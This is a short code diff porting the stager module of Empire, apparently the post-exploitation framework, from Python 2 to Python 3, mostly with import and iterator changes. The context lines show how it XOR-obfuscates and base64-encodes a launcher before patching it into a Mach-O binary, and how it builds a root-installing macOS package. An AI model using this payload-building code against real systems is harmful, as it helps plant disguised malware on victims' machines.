@@ -15,7 +15,13 @@ The Stagers() class in instantiated in ./empire.py by the main menu and includes
 """
 from __future__ import print_function
 from __future__ import absolute_import
+from __future__ import division
 
+from builtins import chr
+from builtins import zip
+from builtins import str
+from builtins import object
+from past.utils import old_div
 import fnmatch
 import imp
 from . import helpers
@@ -26,12 +32,12 @@ import macholib.MachO
 import shutil
 import zipfile
 import subprocess
-from itertools import izip, cycle
+from itertools import cycle
 from .ShellcodeRDI import *
 import base64
 
 
-class Stagers:
+class Stagers(object):
 
     def __init__(self, MainMenu, args):
 
@@ -75,8 +81,8 @@ class Stagers:
         Sets an option for all stagers.
         """
 
-        for name, stager in self.stagers.iteritems():
-            for stagerOption,stagerValue in stager.options.iteritems():
+        for name, stager in self.stagers.items():
+            for stagerOption,stagerValue in stager.options.items():
                 if stagerOption == option:
                     stager.options[option]['Value'] = str(value)
 
@@ -203,7 +209,7 @@ class Stagers:
         if placeHolderSz and offset:
 
             key = 'subF'
-            launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(launcherCode, cycle(key)))
+            launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(launcherCode, cycle(key)))
             launcherCode = base64.urlsafe_b64encode(launcherCode)
             launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
             patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]
@@ -432,7 +438,7 @@ class Stagers:
         os.system("chmod +x expand/Scripts")
         numFiles = subprocess.check_output("find root | wc -l",shell=True).strip('\n')
         size = subprocess.check_output("du -b -s root",shell=True).split('\t')[0]
-        size = int(size) / 1024
+        size = old_div(int(size), 1024)
         p = open('expand/PackageInfo','w+')
         pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
 <pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
